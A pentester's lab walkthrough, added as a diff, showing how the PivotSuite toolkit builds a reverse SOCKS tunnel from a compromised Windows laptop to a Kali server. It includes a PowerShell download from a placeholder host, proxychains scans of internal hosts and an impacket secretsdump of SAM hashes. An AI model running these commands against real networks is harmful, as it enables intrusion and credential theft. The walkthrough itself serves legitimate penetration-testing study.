@@ -1,0 +1,142 @@
+======================================================================================================================================================
+Pivoting with PivotSuite (basic example)
+======================================================================================================================================================
+
+PivotSuite - Network Pivoting Toolkit
+
+=> Github page "https://github.com/RedTeamOperations/PivotSuite"
+
+PivotSuite is a portable, platform independent network pivoting toolkit. It is a Standalone Utility, which can be used as a Server or as a Client.
+
+Key Features
+-------------
+> Supported Forward & Reverse TCP Tunneling
+> Supported Forward & Reverse socks5 Proxy Server
+> Corporate Proxy Authentication (NTLM) Supported
+> Single Pivoting, Double Pivoting and Multi-level pivoting can perform with help of PivotSuite.
+> PivotSuite also works as SSH Dynamic Port Forwarding but in the Reverse Direction.
+
+Context
+--------
+During during penetration tests, PivotSuite can be executed on a target Windows or Linux server (or a Windows laptop) to create a tunnel between this target
+machine and an Internet-facing remote server belonging to the pentesters (e.g. a Kali VM running in AWS or Azure).
+This tool is usefull to pass trhough firewalls and pivot inside a company's internal network after having compromise for example a vulnerable internet-facing 
+website or a laptop via a phishing attack.
+
+Important Note
+---------------
+This tool was not very stable during my tests in my pentest lab environment and I don't recommend using it during 'real-life' penetration tests.
+
+
+===================================================================================================================================
+PoC - Step 1.  Run PivotSuite.py as a server on a Kali VM (192.168.56.104)
+===================================================================================================================================
+
+jeff@kali:~/Documents/Tools/PivotSuite-master/pivot_suite$ sudo python3 ./pivotsuite.py -S --server-option=SP --reverse-connection --server-ip=192.168.56.104 
+                                                                                           --server-port=443 
+                                                                                           
+2023-01-05 13:49:28,459 - DEBUG - [*] PivotSuite TCP Server LISTEN On 192.168.56.104:443 For Reverse TCP Connection
+2023-01-05 13:49:35,569 - DEBUG - [+] Client 192.168.56.1:1492 Connected
+2023-01-05 13:49:35,570 - DEBUG - [+] Configure ProxyChains 0.0.0.0:2502 ==>> HOST 192.168.56.1
+
+
+Notes
+------
+# apt-get install proxychains
+# cp /etc/proxychains.conf /etc/proxychains.conf.backup
+# echo "socks5  127.0.0.1 2502" >> /etc/proxychains.conf
+------------------------------------------------------------------
+Configuration of Proxychains
+------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/rpivot$ tail /etc/proxychains.conf 
+#       proxy types: http, socks4, socks5
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+# socks4  127.0.0.1 1080
+socks5  127.0.0.1 2502
+
+
+=======================================================================================================================================================
+PoC - Step 2. Upload and execute the PivotSuite PE as a client on a compromised Windows 10 Laptop (192.168.13.154) with the Windows Defender AV enabled
+=======================================================================================================================================================
+
+PS C:\temp> (New-Object Net.WebClient).DownloadFile("http://X.X.X.X/pivotsuite.exe","C:\Users\Administrator\Downloads\pivotsuite.exe")
+
+C:\Users\Administrator\Downloads> pivotsuite.exe -C --option=SP --server-ip 192.168.56.104 --server-port 443
+No handlers could be found for logger "root"
+
+Note
+-----
+--option=SP   //Use Client as Socks_Proxy(SP)
+
+
+The pivotsuite software is "not" very stable and randomly stopped several times during my tests...
+
+Traceback (most recent call last):
+  File "<string>", line 156, in <module>
+  File "<string>", line 149, in main
+  File "C:\Users\Administrator\Desktop\pyinstaller-2.0\pivotsuite\build\pyi.win32\pivotsuite\out00-PYZ.pyz\client", line 613, in main
+  File "C:\Users\Administrator\Desktop\pyinstaller-2.0\pivotsuite\build\pyi.win32\pivotsuite\out00-PYZ.pyz\client", line 79, in sock_proxy
+  File "C:\Users\Administrator\Desktop\pyinstaller-2.0\pivotsuite\build\pyi.win32\pivotsuite\out00-PYZ.pyz\client", line 398, in exchange_loop
+socket.error: [Errno 10054] An existing connection was forcibly closed by the remote host
+
+
+======================================================================================================================================================
+PoC - Step 3 - Use Proxychains on the Kali VM (192.168.56.104) and the tunnel established with PivotSuite to pivot into the network '192.168.13.0/24'
+======================================================================================================================================================
+
+Without using Proxychains and the PivotSuite tunnel, the network connection is filtered to the Windows server '192.168.13.154' from the Kali VM '192.168.56.104'
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+jeff@kali:~/Documents/Tools/PivotSuite-master$ nmap -Pn -sT -p 445,3389 192.168.13.154
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2023-01-05 13:54 CET
+Nmap scan report for 192.168.13.154
+Host is up (0.000029s latency).
+                   
+PORT    STATE  SERVICE
+445/tcp closed microsoft-ds
+3389/tcp filtered ms-wbt-server 
+
+
+Example 1 - Nmap port scan of the Windows machines '192.168.13.154' and '192.168.13.151' over the PivotSuite tunnel
+-------------------------------------------------------------------------------------------------------------------
+jeff@kali:~/Documents/Tools/PivotSuite-master$ proxychains nmap -Pn -sT -p 3389 192.168.13.154,151
+ProxyChains-3.1 (http://proxychains.sf.net)
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2023-01-05 15:18 CET
+|S-chain|-<>-127.0.0.1:2814-<><>-192.168.13.154:3389-<><>-OK
+|S-chain|-<>-127.0.0.1:2814-<><>-192.168.13.151:3389-<--timeout
+Nmap scan report for 192.168.13.151
+Host is up (0.00070s latency).
+
+PORT     STATE  SERVICE
+3389/tcp closed ms-wbt-server
+
+Nmap scan report for 192.168.13.154
+Host is up (0.0040s latency).
+
+PORT     STATE SERVICE
+3389/tcp open  ms-wbt-server
+
+
+Example 2 - Secretsdump (impacket) connection to the Windows server (192.168.13.154) over the PivotSuite tunnel
+----------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/PivotSuite-master$ proxychains impacket-secretsdump Laptop1/administrator@192.168.13.154
+ProxyChains-3.1 (http://proxychains.sf.net)
+Impacket v0.9.21.dev1 - Copyright 2020 SecureAuth Corporation
+
+Password:
+|S-chain|-<>-127.0.0.1:7568-<><>-192.168.13.154:445-<><>-OK
+[*] Service RemoteRegistry is in stopped state
+[*] Service RemoteRegistry is disabled, enabling it
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0xafec958786f8362bf3f02d15ab983c61
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:36f7a3ebaa54935ecf<SNIP>
+<SNIP>
